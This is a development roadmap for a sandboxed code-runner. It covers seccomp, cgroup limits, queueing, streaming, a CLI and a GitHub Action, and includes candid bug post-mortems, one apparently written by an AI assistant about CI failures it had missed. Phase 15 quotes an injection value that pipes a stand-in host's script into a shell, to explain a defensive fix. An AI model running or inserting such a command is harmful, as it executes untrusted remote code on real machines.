# sandbin roadmap

## Phase 0 — isolation core (done)

- bubblewrap: namespaces (pid, net, mount, ipc, uts, user), private tmpfs root
- cgroup v2: `memory.max`, `cpu.max`, `pids.max`, `cgroup.kill` teardown
- rlimits: file size, open descriptors, no core dumps
- wall-clock deadline enforced by the supervisor
- adversarial test suite, 14/14 contained

## Phase 1 — seccomp filter (done)

Namespaces stop a guest from reaching the host's files, network and processes.
They do nothing about a guest reaching the *kernel* through a syscall the
kernel itself mishandles. Seccomp is the layer that shrinks that surface.

- allowlist model: default `ERRNO(EPERM)`, explicit `ALLOW` per syscall needed
  by a Python or Bash script — not a blocklist of known-bad calls
- `clone` allowed for ordinary fork/thread use, denied when the flags request
  `CLONE_NEWUSER`, `CLONE_NEWNS`, `CLONE_NEWPID`, `CLONE_NEWNET`,
  `CLONE_NEWUTS`, `CLONE_NEWIPC` or `CLONE_NEWCGROUP` — blocks nested-namespace
  privilege escalation from inside an already-unprivileged sandbox
- `clone3` denied with `ENOSYS` specifically, so glibc's built-in fallback to
  `clone()` kicks in instead of the interpreter aborting on `EPERM`
- `unshare`, `setns`, `ptrace`, `mount`, `umount2`, `pivot_root`, `reboot`,
  `init_module`, `delete_module`, `bpf`, `perf_event_open`, `io_uring_setup`,
  `userfaultfd`, `keyctl`, `personality`, `iopl`, socket-family syscalls — all
  denied by omission from the allowlist
- filter compiled once via a small libseccomp-based generator, exported as raw
  BPF and handed to bubblewrap through `--seccomp FD`
- covers the native architecture plus the 32-bit compat and x32 ABIs, closing
  the classic "switch to a 32-bit syscall table the filter forgot" bypass
- adversarial tests extended: nested user namespace, raw `clone(CLONE_NEWUSER)`,
  ptrace, mount, io_uring, raw socket — each must fail — while subprocess,
  threading, and every Phase-0 case still pass. 23/23 contained.

## Phase 2 — job queue and concurrency (done)

- bounded worker pool: `maxConcurrency` caps how many sandboxed runs execute
  at once, everything past that queues in FIFO order
- per-key concurrency limit (`maxPerKey`) stands in for per-tenant / per-IP
  limits until there's an actual API layer with a real notion of caller
  identity — same mechanism, `key` is just a string for now
- `queuedMs` on every result, `position` returned synchronously at submit
  time, `stats()` for queue depth and running count
- backpressure: `maxQueueLength` rejects immediately with `queue_full` (or
  `key_limit`) once the backlog is full, rather than accepting unbounded
  work or shrinking every run's resource limits
- 6/6 functional cases, all against real spawned sandbox runs: concurrency
  actually observed to be bounded under load, backpressure fires exactly at
  capacity, a crashing job still frees its slot for the next one

## Phase 3 — streaming API (done)

- `POST /runs` submits a job to the queue and returns immediately with
  `{ accepted, runId, position }` (or a rejection, same as `queue.submit()`)
- `GET /runs/:id/stream` (WebSocket) delivers `queued` -> `started` ->
  `chunk` (repeated) -> `finished`, replaying whatever already happened if
  the client connects late, mid-run, or after the run is done
- `sandbox.mjs` gained `onChunk`/`onSpawn` hooks so the server can observe a
  run live without changing `run()`'s existing single-promise contract for
  callers that don't need streaming
- interactive stdin: a `{ type: 'stdin', text }` WebSocket message writes to
  the guest's stdin while it's still running, verified against a real
  `input()` call that blocks until the reply arrives
- found and fixed a real bug via the "chunks arrive incrementally" test:
  CPython fully buffers stdout when it isn't a TTY, so three separate
  `print()` calls arrived as one chunk at exit instead of three live ones.
  Fixed with `-u`. Would not have been caught without asserting on real
  wall-clock gaps between chunks, not just their final content.
- 7/7 functional cases against a real HTTP+WebSocket server on an ephemeral
  port, no mocks: incremental delivery, interactive stdin, backpressure over
  HTTP (429), bad input (400), reconnect-after-finish replay, unknown run id

## Phase 4 — per-language runtime images (done)

- Node.js added as a second interpreter, C as a compiled language — proves
  the design isn't interpreter-only
- Node's binary lives wherever the host happens to keep it (`mise`, `nvm`,
  a CI tool-cache directory, `/usr/bin` — no fixed location), so its path is
  resolved once at startup via `realpathSync(process.execPath)` — the exact
  binary already running sandbin itself — rather than assumed. Its install
  directory is read-only bind-mounted in alongside `/usr`
- C runs in two sandboxed phases, not one: `gcc` compiles under its own,
  more permissive resource profile (256 MB / 10 s, since compiling
  legitimately needs more of both than running a script does), and only on
  success does a second, separate sandboxed invocation execute the result
  under the caller's normal limits. A compile failure short-circuits before
  ever reaching the second phase and reports `compile_error` with the
  compiler's own diagnostic as `stderr`
- the compile phase's `/box` is mounted read-write (`--bind`, not
  `--ro-bind`) so `gcc` can write `a.out` — the only image that needs this;
  every execute-phase mount, and every other language, stays read-only
- three real bugs surfaced by actually running each new language, none of
  them visible from reading the code:
  - `gcc`/`ld` inside the sandbox produced `a.out` at mode `644`, not the
    normal `755` — executing it then failed with a plain permission error.
    The cause was `umask` itself being seccomp-denied (missing from the
    allowlist entirely, an oversight from the original policy, not a
    deliberate exclusion); denying a benign query syscall broke a subprocess
    three layers removed from the syscall that actually failed
  - Node produced clean exit code 0 with completely empty `stdout` — libuv
    probes any given stdio fd with `getsockopt`/`getsockname` to tell a pipe
    from a socket from a TTY, regardless of what the fd actually is, and
    with both seccomp-denied it apparently misdetected the stream type
    and silently dropped writes rather than erroring visibly. Both were
    intentionally absent as part of "deny the whole socket family" — adding
    them back is safe: they only read metadata about an fd the guest already
    holds, `socket()` itself (creating a new one) stays fully denied, and
    the "network blocked" adversarial case still passes
  - a sustained C memory bomb (write, then `sleep(3)`) is caught correctly
    (`memory_limit`, `oomKills: 1`), but the identical allocation without the
    sleep sometimes exits cleanly with a tiny reported peak. This isn't a
    sandbin bug: cgroup v2's `memory.max` attempts reclaim before escalating
    to an OOM kill, and a spike brief enough to finish and free itself before
    that escalation completes can legitimately slip through. True for any
    language, not just C — Python's earlier memory-bomb test only ever
    looked reliable because touching 512 MB in a loop takes measurably
    longer than one `memset`
- 32/32 adversarial cases, including per-language network and sustained
  memory checks for both new languages

## Phase 5 — frontend (done)

- single-page editor: language picker, code area, stdin box, run button —
  plain HTML/CSS/JS, no framework, no build step, no font or color beyond
  black, white and one gray for secondary text
- live output panel fed by the Phase 3 WebSocket; interactive stdin works
  through the same UI, verified against a real blocking `input()` call
- resource panel: verdict, duration, CPU time, peak memory, exit code — the
  numbers `sandbox.mjs` already computes, just rendered
- served as static files straight off `server.mjs` (`GET /`, `/styles.css`,
  `/app.js`) rather than deployed separately — there's one process to run,
  and nothing here needs a build step or a second server
- found two real bugs by actually clicking through it in a browser rather
  than trusting the API tests alone:
  - a run finishing before the WebSocket handshake completes (routine, given
    ~20ms cold starts) replays only a single `finished` message with no
    `chunk` events; the frontend rendered stats but never the buffered
    `stdout`/`stderr` from that message, so fast programs showed empty
    output. Fixed by falling back to the buffered result when no chunk was
    ever seen live.
  - the default 5s wall-clock limit is sized for automated submissions, not
    a human reading a prompt and typing a reply — a real interactive session
    routinely exceeds it. The frontend now requests `wallClockMs: 30000` for
    its own submissions; every other ceiling (memory, CPU, pids) is
    unaffected.
- no headless-browser test suite for this layer: the API it depends on
  (Phase 3) is already covered end to end, and Playwright/Puppeteer would be
  a heavy dependency for a three-file static page. Verified manually instead
  — basic run, incremental output, interactive stdin via both Enter and the
  send button, stderr styling. A gap worth naming, not hiding.

## Phase 6 — CI and publish (done)

- GitHub Actions runs all three suites (sandbox, queue, server) on every
  push and pull request, with a 5-minute job timeout so a genuine hang fails
  fast instead of consuming CI budget silently
- `bubblewrap`, `libseccomp-dev` and `gcc` installed explicitly in CI rather
  than assumed present on the runner image
- the runner needed two real fixes that were entirely about the environment,
  not sandbin's own code: Ubuntu 24.04's default-on AppArmor restriction on
  unprivileged user namespaces, and a cgroup hierarchy where the job's own
  cgroup lives under `system.slice` with resident processes rather than a
  process-free `user.slice` session — the second one is why `findDelegatedRoot`
  walks up looking for a process-free ancestor instead of assuming one
  fixed path. Documented in README's Requirements rather than special-cased
  quietly
- repository pushed to GitHub under a single author, `ayazdoruck`; every
  commit message states what broke and how it was actually found, not just
  what changed

## Phase 7 — live resource telemetry (done)

- `sandbox.mjs` gained an `onStats` hook alongside `onChunk`/`onSpawn`:
  while the guest runs, its cgroup's `memory.current` and `cpu.stat` are
  polled every 50 ms and handed to the caller as `{ t, memBytes, cpuMs }`,
  same shape and same hook pattern as the existing streaming callbacks —
  `run()`'s single-promise contract for non-streaming callers is untouched
- the server broadcasts each sample as a `stats` WebSocket message and
  buffers them per run, replayed alongside buffered chunks for anyone who
  connects mid-run — the exact same catch-up mechanism Phase 3 already
  built for `chunk`, extended rather than duplicated
- both frontends (the real playground and the docs site's recorded demo)
  draw the same thing from it: a canvas sparkline of live memory usage,
  revealed once a run starts and left showing the full trace once it ends
- deliberately no `pids.current` or dual-axis CPU line in v1 — one metric,
  drawn well, beats two metrics fighting for the same 72px of height
- honest about the gap this doesn't close: at a 50 ms poll interval, most
  sandbin runs (~20 ms median, see [Benchmarks](https://sandbin.vercel.app/benchmarks))
  finish before a single sample is taken. The graph is for the minority of
  runs that actually run long enough to have a story to tell — a tight
  memory loop, a deliberate `sleep`, an interactive session — not for the
  one-liners the whole project is fastest at. Verified with a real test
  that forces exactly that case: a loop that grows a `bytearray` with a
  `time.sleep()` between iterations, asserting on cgroup-reported
  `memory.current` actually increasing across samples, not on anything the
  guest claims about itself
- 46/46 tests passing (`test:server` gained one case, everything else
  unchanged)

## Phase 8 — shareable permalinks (done)

- every finished run is saved automatically, no opt-in: `src/permalinks.mjs`
  is a small disk-backed store (one JSON file per run, keyed by the same
  `runId` already returned by `POST /runs`) with no new dependency and no
  database — `save`/`load`/`sweep`, TTL-checked lazily on read and swept
  hourly, 30 days by default
- `GET /r/:runId` serves an HTML page that replays the run: the original
  code, the streamed output, and the resource graph, timed from the actual
  recorded `chunk`/`stats` timestamps rather than dumped instantly — a
  shared timeout run doesn't force a visitor to watch it in real time
  either, since each step's wait is capped at 800 ms. `GET /r/:runId/data`
  is the JSON it's built from
- a real ordering bug caught before it shipped, not after: the first version
  broadcast `finished` over the WebSocket and then fired off the permalink
  save without awaiting it. A client that fetched its own permalink the
  instant it saw `finished` — which is exactly what the playground's own
  "share this run" link invites someone to do — could race the write and
  get a 404 for a run that very much existed. Fixed by awaiting the save
  before broadcasting `finished` at all; a dedicated server test submits a
  run, waits for it to finish over the socket, and immediately fetches the
  permalink to prove the race is actually closed, not just less likely
- the id is an unguessable UUID: unlisted, not secret, the same trust model
  as a Gist or a paste link — sharing one shares exactly what was submitted
  and what it produced, nothing more, and nothing requires a login to see
- TTL correctness is tested against a real filesystem with an injected
  clock (`load(id, { now })`, `sweep({ now })`) rather than actually
  waiting 30 days or mocking the filesystem — new `test:permalinks` suite,
  5 cases, plus 3 new server-level cases covering the HTTP surface and the
  save-before-broadcast race specifically
- 54/54 tests passing across four suites

## Phase 9 — API keys and rate limits (done)

- two new, deliberately tiny modules, each doing one thing: `src/ratelimit.mjs`
  is a fixed-window counter (`check`/`peek`, per-id buckets, injectable
  clock), `src/apikeys.mjs` is a disk-backed key store (`issue`/`load`,
  same one-JSON-file-per-record pattern as `permalinks.mjs`) — no new
  dependency, no database, for either
- anonymous callers (keyed by IP) get 20 runs/hour; `POST /keys` issues a
  free `sb_`-prefixed key with a 200/hour quota, no signup; `GET /keys/:key`
  reports the current window without consuming it
- deliberately did not overload `X-Sandbin-Key`'s existing job: that header
  already partitions `maxPerKey` *concurrency* (Phase 2), a completely
  different axis from an hourly request *quota*. An arbitrary caller-chosen
  string still works for concurrency partitioning at the anonymous
  rate-limit tier exactly as before — it only unlocks the higher tier when
  it happens to match a key actually issued by `POST /keys`. Nothing about
  the existing documented header behavior changed
- key issuance is itself rate-limited by IP (5/hour) — the obvious hole in
  a "free API key, no signup" design is minting unlimited fresh keys to
  keep resetting your own quota, so the mint endpoint sits behind the same
  limiter it's handing out access to
- the rate-limit check runs first in `submitRun`, before language/code
  validation — a client hammering the endpoint with garbage payloads still
  gets throttled, not free retries because their request happened to be
  malformed
- tested at both layers: `test:ratelimit` (5 cases) and `test:apikeys`
  (5 cases) exercise the modules directly with independent ids and
  injected clocks; `test:server` adds 5 HTTP-level cases including the one
  that actually matters — a request carrying a real issued key succeeds
  even after the anonymous per-IP bucket for the same test client is
  already exhausted, proving the two tiers are genuinely separate buckets
  and not just a relabeled version of the same counter
- 69/69 tests passing across six suites

## Phase 10 — Go support (done), Rust attempted and shelved

- `go` joins `c` as the second compiled language, registered in `IMAGES`
  only when `go env GOROOT` actually resolves to something — the same
  "offer exactly what the host can do" principle Node's own binary
  resolution already established, extended to an entire language rather
  than just a binary path. A host without Go installed simply doesn't
  offer it; nothing breaks, nothing lies about being available
- toolchains managed by a version-switching shim (`mise`, `rustup`,
  `asdf`) don't live under `/usr` and the shim itself needs host state
  (config files, env vars) to pick a version — state that has no business
  being inside the sandbox. `resolveToolchain()` asks the shim once, on
  the host, for the real install root (`go env GOROOT`), and every
  sandboxed run binds that root in directly and execs the real binary,
  never the shim
- the interesting failure was resource, not security: `go build` on a
  cold cache means compiling the Go runtime and standard library from
  source, and that blew through the compile sandbox's `pids.max` (Go's
  own scheduler spawns OS threads for parallel compilation) and then its
  `ulimit -f` (an intermediate package archive for `runtime` itself
  landed over the file-size cap) — both real ceilings doing exactly what
  they're for, just sized for a one-file program compiling against an
  already-built stdlib, not building that stdlib from nothing. Capping
  `GOMAXPROCS=2` fixed the first; the second needed an actual persistent,
  shared, writable `GOCACHE` (`data/go-cache/`), warmed once with a
  trivial program *outside* the sandbox entirely (no ceilings, because
  there's nothing adversarial about compiling the standard library) the
  first time a Go-capable `sandbox.mjs` loads. Every real sandboxed
  compile after that only ever has its own small package left to build —
  verified empirically, not assumed: the same "hello world" compile went
  from failing on a cold cache to a 14 ms `ok` once the cache was warm,
  same limits, same everything else
- `net` alone, even after the cache was warm, still failed differently:
  Go's `net` package can fall back to `cgo` for name resolution, which
  means shelling out to `gcc` as a *second* compiler invocation from
  inside the first one — an entire extra layer of process spawning that
  has no reason to exist for a sandboxed guest that was never going to
  reach a real resolver anyway. `CGO_ENABLED=0` forces Go's own
  pure-Go resolver, which needed nothing from `gcc` and nothing extra
  from the sandbox once removed
- adversarial coverage added to `test:sandbox` follows the exact pattern
  Node and C already established — compile-and-run, a syntax error
  surfacing as `compile_error`, network blocked at the syscall level
  (`net.Dial` failing with the guest's own `EPERM`, not a timeout), and a
  sustained memory bomb caught by the cgroup, `oomKills > 0`. All four are
  wrapped in `IMAGES.go ? [...] : []` so the suite is still exactly right
  — neither inflated nor silently short — on a host without Go
- **Rust was attempted in the same pass and shelved, not shipped broken.**
  `rustc`, sandboxed, fails invoking its own linker (`cc`) with a bare
  `EPERM` — the *exact* symptom `POSIX_SPAWN_RESETIDS` produces when the
  `setuid`/`setgid`/`setresuid`/`setresgid` family is missing from the
  seccomp allowlist, which it was: an oversight, not a deliberate
  exclusion, in the same category as `umask` and `getsockopt` from Phase
  4 — a syscall family with no real security cost to allow (an
  unprivileged process calling `setuid()` on its own uid is a genuine
  no-op; the kernel's own permission check, not this filter, is what
  would actually stop anything more) but the fix, verified with an
  isolated reproduction via `os.posix_spawn(resetids=True)`, did not fix
  `rustc` itself. It's kept in the policy anyway — real, evidenced, and
  harmless — while the hunt for what `rustc` *actually* hits continued
  and came up short:
  - reproduced with an `LD_PRELOAD` shim interposing `fork`, `vfork`,
    `posix_spawn`, `posix_spawnp`, `execve`, and the raw `syscall()` entry
    point for the `clone`/`vfork`/`execve`/`clone3`/`execveat` numbers
    specifically — confirmed working (it catches `bash`'s own `fork`+`exec`
    of `cc` inside the identical sandbox, and catches `rustc`'s own spawn
    of `cc` when run *unsandboxed* on the host) but sees *nothing at all*
    from `rustc` the moment it runs sandboxed, right up to the same error
  - `AT_SECURE` (glibc's dynamic-linker secure-execution flag, which would
    explain `LD_PRELOAD` being silently ignored) checked directly via
    `getauxval(AT_SECURE)` inside the sandbox: 0, both as the direct exec
    target and via an inner shell — ruled out, not assumed
  - cgroup `pids.max`, `memory.max`, the compile sandbox's `ulimit -f`, and
    process/session-group leadership were each isolated and individually
    ruled out by direct reproduction with only that one variable changed
  - what's left, that would explain a real spawn attempt producing zero
    matches against *any* of `fork`/`vfork`/`posix_spawn`/`posix_spawnp`/
    `execve`/raw-`syscall`-for-those-numbers: `rustc` issuing the
    equivalent syscall through neither a named libc symbol nor libc's own
    generic `syscall()` entry point — e.g. an inlined raw syscall
    instruction compiled directly into `rustc`'s own binary. That's a real
    hypothesis, not a confirmed one, and confirming it needs kernel-level
    tracing (`strace`, or root for `auditd`/`ftrace`) that wasn't available
    where this was investigated
  - left out of `IMAGES` entirely rather than registered and silently
    broken. The setuid/setgid fix stays; `rust` stays absent until this is
    actually resolved, not worked around with a guess
- 73/73 tests passing across six suites (`test:sandbox` gained the four
  Go cases; everything else unchanged)

## Phase 11 — `sandbin` CLI (done)

- a real `bin/sandbin.mjs`, wired up as `package.json`'s `bin` entry so
  `npm link` gives a `sandbin` on `PATH`. Two modes, one interface:
  **local**, which imports `sandbox.mjs` directly and calls `run()` with no
  server involved at all, and **remote** (`--server <url>`), which speaks
  the exact HTTP + WebSocket protocol the browser frontend already speaks
  — `POST /runs`, then stream `/runs/:id/stream` — so the CLI is a second,
  independent client against the same API surface rather than a special
  path of its own
- local is the default on purpose, not remote: the more common case for
  someone who already has the repo checked out is "run this one file
  through the real sandbox right now," which needs nothing running and no
  port to pick. `--server` (or `SANDBIN_SERVER`) switches the same command
  over to hitting a sandbin instance running somewhere else, local or not
- language is inferred from the file extension (`.py`, `.sh`/`.bash`,
  `.js`/`.mjs`/`.cjs`, `.c`, `.go`) when a file is given, with `-l` to
  override or supply it outright for `-e`/stdin input. Code can come from
  a file, `-e/--eval`, or piped stdin — deliberately not from more than
  one of those in the same invocation, no ambiguity about which wins
- output streams live, stdout and stderr each to their own real stream, as
  `chunk` events arrive — both in local mode (`onChunk` wired straight
  into `run()`) and remote mode (the same WebSocket `chunk` messages the
  frontend already renders). `--json` turns this off and prints the whole
  result object instead, once, for scripting
- one real gap found writing the adversarial test for it, not by
  inspection: `run()`'s `onChunk` only ever covers the *execute* phase —
  the compile phase (`c`, `go`) never gets the callback at all (see
  `sandbox.mjs`'s two `spawnInSandbox` calls in `run()`). A compile
  failure was streaming nothing and then printing a bare
  `verdict compile_error` with zero indication of what the compiler
  actually said — technically correct, practically useless. Fixed by
  printing the result's own captured `stderr` in full for exactly the two
  verdicts where the streamed callback wouldn't have shown it
  (`compile_error`, `setup_failed`) — not a change to `sandbox.mjs`, the
  result already carried the diagnostic, the CLI just wasn't showing it
- exit code is `0` for verdict `ok`, `1` for anything else — deliberately
  *not* a passthrough of the guest's own exit code (a guest exiting `3`
  still means the sandbin CLI invocation itself succeeded at running it
  and observing that; the verdict, printed to stderr alongside duration,
  CPU and peak memory, is what actually failed). Kept scriptable: no
  interactive stdin forwarding in this pass, `-i/--stdin <file>` (or `-`
  for the CLI's own stdin, mutually exclusive with reading code from
  stdin) covers the fixed-input case the API itself supports
- `sandbin languages` and `sandbin keys create`/`keys status` round out
  the surface — the first reads local `IMAGES` directly (so it reflects
  this exact host, `go` included only if a toolchain was actually found),
  the second two are thin wrappers over the existing `POST /keys` and
  `GET /keys/:key` endpoints, no new server-side surface added for either
- tested as a real subprocess, not by importing its functions — `cli-test.mjs`
  spawns the actual `bin/sandbin.mjs` with `node`, both against `run()`
  directly (local) and against a real `createServer()` on an ephemeral
  port (remote), and asserts on captured stdout/stderr/exit code exactly
  the way a real caller would observe them, including the guest-exit-3
  case and the compile-error-shows-diagnostic fix above
- 83/83 tests passing across seven suites (`test:cli`, 10 cases, is new;
  everything else unchanged)

## Phase 12 — `/metrics` dashboard (done)

- a live view of the server process itself: `GET /metrics` (HTML,
  black-and-white, matching the existing frontend) polls
  `GET /metrics/data` (JSON) every two seconds and renders submitted /
  accepted / rejected counts, finished runs broken down by verdict and by
  language, average duration / CPU / peak memory across finished runs,
  the live queue's running/waiting depth, and how many API keys have been
  issued
- counters live entirely in memory (`src/metrics.mjs`, a handful of plain
  objects and a `snapshot()` call) and reset on restart — deliberately not
  persisted, the same "no database" stance the rest of the project already
  takes for the queue and rate limiter. The one exception, permalinks, is
  already opt-out-proof and disk-backed for a real reason (a shareable
  link has to survive the process that created it); a metrics counter
  answering "how's this instance doing right now" doesn't need to
  survive a restart to do its job
- deliberately not a new subsystem bolted alongside the server — every
  counter increments at a point `server.mjs` was already handling: a
  submission (`recordSubmitted`), a rejection with its actual verdict
  (`rate_limited`, `bad_request`, `queue_full`, `key_limit`, whichever
  `submitRun` was already about to return), an accepted run
  (`recordAccepted`), a finished run's real result once `ticket.result`
  resolves (`recordFinished`, verdict + language + duration/cpu/peak from
  the same object the WebSocket `finished` message already carries), and
  a successful `POST /keys` (`recordKeyIssued`). The live running/waiting
  numbers aren't tracked a second time at all — `queue.stats()` already
  existed (`queue-test.mjs` has exercised it since Phase 2) and is reused
  as-is rather than duplicating state that would just as easily drift out
  of sync with the real queue
- tested at two levels, matching how `apikeys.mjs`/`ratelimit.mjs` are
  already tested: `metrics-test.mjs` covers the counters in isolation (a
  fresh store is all zeros, accepted/rejected/finished stay independent
  and correctly broken down, averages are computed as a real mean rather
  than accumulated, uptime advances with real wall-clock time) and two
  cases added to `server-test.mjs` hit `GET /metrics/data` on a real
  server after real runs and a real rejection, asserting the numbers that
  come back match what was actually just done — not just that the route
  returns 200
- verified in a real browser, not just over the API: started the server,
  drove several real runs and a rejection through `curl`, loaded
  `/metrics` and confirmed every section rendered with the right numbers,
  then submitted one more run and watched the page's own 2-second poll
  pick it up with no manual reload
- 91/91 tests passing across eight suites (`test:metrics`, 6 cases, and
  two new cases in `test:server`; everything else unchanged)

## Phase 13 — Basic Auth on `/metrics` (done)

- the dashboard added in Phase 12 was open by default, which is fine for
  a local clone and wrong for anything a stranger can reach: rejection
  counts, per-language usage, and exactly how many API keys have been
  issued are real operational detail, not something to hand out for free
- `SANDBIN_METRICS_USER` + `SANDBIN_METRICS_PASS`, both required to
  enable, gate both `GET /metrics` and `GET /metrics/data` behind HTTP
  Basic Auth (`metricsAuth: { user, pass }` on `createServer()`,
  test-injectable the same way `permalinkDir`/`apiKeyDir` already are).
  Unset — the default — keeps today's open behavior, logged plainly at
  startup (`/metrics is open — set SANDBIN_METRICS_USER and
  SANDBIN_METRICS_PASS...`) rather than silently
- Basic Auth specifically because it needed zero frontend changes: the
  browser's own native credential prompt handles `/metrics` the moment
  the server returns `401` with `WWW-Authenticate: Basic`, and
  `curl -u user:pass` handles `/metrics/data` — no login page, no token
  storage, no JS to write or maintain
- four cases added to `server-test.mjs`, each spinning up a real server
  with `metricsAuth` configured: no credentials → 401 with the
  `WWW-Authenticate` header present, wrong credentials → 401 (not
  silently treated as "no auth configured"), correct credentials → 200
  with real data, and the HTML page gated exactly like the JSON route
  rather than just the data endpoint
- 95/95 tests passing across eight suites (`test:server` gained the four
  auth cases; everything else unchanged)

## Phase 14 — real load/concurrency benchmark (done)

- `src/loadtest.mjs` (`npm run loadtest`) spins up a real
  `createServer()` on an ephemeral port — no mocks — and drives it
  exactly the way a real client would: `POST /runs`, then a WebSocket
  connection per accepted run waiting for its `finished` message. Two
  scenarios, chosen to answer two different questions the cold-start
  comparison never could:
  - **Sustained, at the default concurrency limit** — 100 requests,
    client concurrency held at 4 (the queue's own default
    `maxConcurrency`), so nothing ever sits in the backlog. Stable
    across repeated runs: 119–132 req/s, p50 27–32ms, p95 46–48ms, 0
    rejections
  - **Overload, past capacity** — 60 requests fired at once with zero
    client-side throttling, against a queue deliberately shrunk to a
    20-slot capacity (`maxConcurrency=4` + `maxQueueLength=16`).
    `maxPerKey` raised out of the way first, specifically to isolate the
    *global* `queue_full` path from the *per-key* `key_limit` path
    (already its own dedicated case in `queue-test.mjs`) rather than
    conflating the two
- one confound found and removed before the numbers meant anything:
  every request in both scenarios shares one loopback IP, which would
  trip the real 20/hour anonymous rate limit within the first second and
  make the *rate limiter* the thing being measured instead of the queue.
  `createServer({ anonymousRequestsPerHour: 100_000, ... })` — already a
  constructor option, added for exactly this kind of test injection back
  in Phase 9 — removes it as a variable without touching the rate
  limiter itself
- the overload scenario's own result is the more interesting finding:
  **exactly 20 accepted on every single run** — the queue's accounting
  under real concurrent arrival is precise, not approximate — and **all
  40 rejections landed as `queue_full`, never `key_limit`**, confirming
  the isolation actually worked rather than assuming it did. Rejections
  also resolved in 36–62ms against accepted runs' 139ms median — a
  caller finds out it was turned away about as fast as one that got
  accepted starts running, not after being left waiting
- run three times before writing anything down, specifically to check
  the numbers weren't a one-off fluke before they went into
  `docs/benchmarks.html`'s new "Concurrency and throughput" section
  alongside the existing cold-start comparison, with the same
  methodology/reproduce-it structure the rest of that page already uses
- deliberately not part of `npm test` — it measures performance, not
  correctness, and belongs alongside the existing benchmarks rather than
  gating CI on wall-clock numbers that will legitimately vary by machine

## Phase 16 addendum — the go-cache fix wasn't actually the whole fix

The `process.cwd()` → `os.tmpdir()` move (above) was real and necessary,
but CI kept intermittently failing on `go: compiles and runs`
specifically, roughly one push in three, even after it landed. No warm-up
error ever printed — the fix from the same phase that made warm-up
failures always log had nothing to say, because the warm-up wasn't
failing. It was warming the wrong thing.

The warm-up program was `package main; func main() {}` — no imports. It
only ever forced the bare runtime into the cache. Every real Go test case
imports `fmt` (all three of them do; two also pull in `net` or `time`),
and `fmt`'s own dependency tree (`errors`, `os`, `reflect`, `syscall`,
more) was still completely cold the first time any of them actually ran.
On this machine that cold compile finishes comfortably inside the compile
sandbox's limits — fast CPU, nothing else contending for it. On a shared,
variable-performance GitHub-hosted runner, it sometimes didn't, and hit
the exact `pids.max` failure the warm-up exists to prevent.

Fixed by warming what's actually used: the warm-up program now imports
and genuinely uses `fmt`, `net` and `time`, matching the adversarial
suite's own real dependency footprint instead of the smallest program
that happens to compile. Verified with real signal, not a single green
run: 4 consecutive CI runs after the fix (`gh run rerun`, watched to
completion each time), against roughly 1-in-3 failing before it.

## Phase 15 — GitHub Action (done)

- `action.yml` at the repo root, a composite action so any workflow can
  do `uses: ayazdoruck/sandbin@main` and get a real sandboxed run as a
  step — inputs mirror the CLI's own flags (`code`/`code-file`,
  `language`, `stdin`, the four limit overrides, `fail-on-error`),
  outputs are `verdict`/`exit-code`/`stdout`/`stderr`
- installs exactly what this project's own CI already installs
  (`bubblewrap`, `libseccomp`, `gcc`, `golang-go` only when
  `language: go`, the AppArmor unprivileged-userns sysctl) rather than
  inventing a second set of host requirements — same Ubuntu-family-runner
  assumption as everywhere else in this repo
- the one thing that got real security attention rather than being
  written on autopilot: every user-supplied input that flows into a
  `run:` step is passed through `env:`, never interpolated directly into
  the script text. Directly interpolating `${{ inputs.code }}` into a
  `run:` block is a well-known Actions injection class — the input value
  becomes part of the script GitHub actually executes, so `code`
  containing something like `"; curl evil.sh | sh #` would run on the
  runner before sandbin ever got a chance to sandbox anything. Getting
  this wrong specifically here — in the action whose entire purpose is
  running untrusted input safely — would have undermined the whole point
- output parsing avoids shell string-munging entirely: the CLI's own
  `--json` result is read and turned into `$GITHUB_OUTPUT` entries by a
  small inline Node script (`node --input-type=module -e '...'`), using
  a randomly generated heredoc delimiter for the multi-line
  `stdout`/`stderr` outputs per GitHub's own documented format, rather
  than a fragile `grep`/`jq` pipeline
- verified two ways: every step's shell/Node logic was extracted and run
  by hand locally first (`GITHUB_OUTPUT` pointed at a real temp file,
  `github.action_path` at the repo root) against a success case, a
  `fail-on-error: true` failure case, and a `fail-on-error: false` one —
  confirming the exact `$GITHUB_OUTPUT` contents and exit codes before
  any of it went near a real workflow. `.github/workflows/action-test.yml`
  is the real test: it uses `./` (this repo, checked out by the workflow
  itself) as the action and asserts on the same three cases end to end,
  running on every push same as `ci.yml`
- what local hand-testing can't cover: whether `uses: ./` and
  `github.action_path` resolve the way the composite-action docs say
  they will inside an actual Actions runner. That only gets proven by
  the real workflow run this repo's own CI now performs on every push —
  the same trust boundary this project already accepts for `ci.yml`
  itself, which was never re-run locally either

## Phase 16 — a real CI-only bug, found by actually checking CI (done)

Not a new feature — a process failure worth recording as honestly as the
bugs in every other phase, because it was one.

- **the gap:** every phase from Go onward (Phases 10 through 15, eight
  pushes) was reported here and to the person running this project as
  "N/N tests passing" based entirely on local `npm test` output. Nobody
  — meaning this assistant — actually checked whether GitHub's own CI
  run for any of those pushes was green. It wasn't. Every single one of
  them failed, silently, the whole time, on exactly the same three Go
  test cases
- **the actual bug**, once someone finally ran `gh run list` and looked:
  `bwrap`, invoked with `--unshare-all`, failed the Go compile step with
  a plain `bwrap: Can't find source path
  .../data/go-cache: Permission denied` — even though the process calling
  it was real root (`sudo env "PATH=$PATH" npm test`, required for cgroup
  access in CI, same as always). Reproduced by hand outside Node entirely:
  a raw `bwrap` invocation using the exact flags `buildBwrapArgs`
  generates, run as root, binding the exact same path, failed the exact
  same way — ruling out anything Node-specific and pointing straight at
  bind-mount behavior under a freshly unshared user namespace
- **why it only showed up in CI:** `GO_CACHE_DIR` was
  `path.join(process.cwd(), 'data', 'go-cache')`. On a normal dev
  machine, `npm test` runs as your own unprivileged user, who owns their
  own home directory outright — no permission boundary anywhere in that
  path ever needs crossing. In this project's own CI, the whole test
  process runs as root (for cgroup access), but the checkout — and
  therefore `process.cwd()` — belongs to the unprivileged `runner`
  account, whose home directory isn't world-traversable. `bwrap` binding
  a source path under an ancestor directory it can't traverse fails with
  exactly this error, and evidently does so even for a caller that started
  as real root, once that caller has unshared into a new user namespace —
  confirmed by the side-by-side repro: binding `/usr/lib/go-1.22` (a
  world-readable system path, root-owned, no restrictive ancestor
  anywhere in it) worked fine under the identical flags; binding the
  `runner`-owned path under `/home/runner` did not
- **the fix:** move `GO_CACHE_DIR` off `process.cwd()` entirely, onto
  `os.tmpdir()` — exactly where `run()`'s own per-request `hostDir`
  already lived, for what turns out to be the same underlying reason
  (`/tmp` is universally world-traversable, so this class of failure
  structurally can't happen there). One line changed
  (`src/sandbox.mjs`), confirmed with the real end-to-end repro before
  the fix and the real CI run going green after it — not just local
